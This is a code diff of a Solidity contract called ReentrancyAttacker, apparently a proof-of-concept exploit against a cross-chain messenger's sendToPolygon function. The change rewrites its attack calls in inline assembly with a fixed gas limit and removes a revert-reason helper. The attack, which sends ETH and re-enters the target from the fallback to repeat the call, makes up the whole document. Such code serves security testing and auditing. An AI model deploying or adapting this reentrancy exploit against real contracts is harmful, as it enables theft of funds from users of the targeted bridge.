@@ -8,13 +8,13 @@ contract ReentrancyAttacker {
     uint256 public attackCount;
     uint256 public constant ATTACK_VALUE = 1 ether;
     uint256 public constant MIN_BALANCE = 2 ether;
-    uint256 public constant GAS_LIMIT = 500000;
+    uint256 public constant GAS_LIMIT = 300000;
 
     event AttackAttempted(uint256 value, uint256 count);
     event ReentrancyCallFailed(string reason);
     event FallbackCalled(uint256 balance, uint256 count);
 
-    constructor(address payable _messenger) {
+    constructor(address _messenger) {
         require(_messenger != address(0), "Invalid messenger address");
         messenger = CrossChainMessenger(_messenger);
     }
@@ -23,16 +23,27 @@ contract ReentrancyAttacker {
         require(msg.value >= MIN_BALANCE, "Need at least 2 ETH");
         attackCount = 0;
 
-        // Initial call with fixed gas limit
-        (bool success, bytes memory data) = address(messenger).call{
-            value: ATTACK_VALUE,
-            gas: GAS_LIMIT
-        }(abi.encodeWithSelector(messenger.sendToPolygon.selector, address(this)));
+        // Use direct low-level call with fixed gas
+        bytes memory payload = abi.encodeWithSignature(
+            "sendToPolygon(address)",
+            address(this)
+        );
 
-        if (!success) {
-            string memory reason = _getRevertMsg(data);
-            emit ReentrancyCallFailed(reason);
-            revert(reason);
+        assembly {
+            let success := call(
+                GAS_LIMIT,           // gas
+                sload(messenger.slot), // target
+                ATTACK_VALUE,        // value
+                add(payload, 0x20),  // input data offset
+                mload(payload),      // input data length
+                0,                   // output data offset
+                0                    // output data length
+            )
+
+            // Revert on failure
+            if iszero(success) {
+                revert(0, 0)
+            }
         }
 
         emit AttackAttempted(ATTACK_VALUE, 0);
@@ -44,30 +55,30 @@ contract ReentrancyAttacker {
         if (currentCount < 1 && address(this).balance >= ATTACK_VALUE) {
             emit FallbackCalled(address(this).balance, currentCount);
 
-            (bool success, bytes memory data) = address(messenger).call{
-                value: ATTACK_VALUE,
-                gas: GAS_LIMIT
-            }(abi.encodeWithSelector(messenger.sendToPolygon.selector, address(this)));
+            bytes memory payload = abi.encodeWithSignature(
+                "sendToPolygon(address)",
+                address(this)
+            );
 
-            if (!success) {
-                string memory reason = _getRevertMsg(data);
-                emit ReentrancyCallFailed(reason);
-                revert(reason);
+            assembly {
+                let success := call(
+                    GAS_LIMIT,           // gas
+                    sload(messenger.slot), // target
+                    ATTACK_VALUE,        // value
+                    add(payload, 0x20),  // input data offset
+                    mload(payload),      // input data length
+                    0,                   // output data offset
+                    0                    // output data length
+                )
+
+                // Revert on failure
+                if iszero(success) {
+                    revert(0, 0)
+                }
             }
 
             attackCount = currentCount + 1;
             emit AttackAttempted(ATTACK_VALUE, attackCount);
         }
-    }
-
-    // Helper function to extract revert reason
-    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
-        // If the _returnData length is less than 68, then the transaction failed silently (without a revert message)
-        if (_returnData.length < 68) return "Transaction reverted silently";
-        assembly {
-            // Slice the sighash of the revert statement
-            _returnData := add(_returnData, 0x04)
-        }
-        return abi.decode(_returnData, (string));
     }
 }
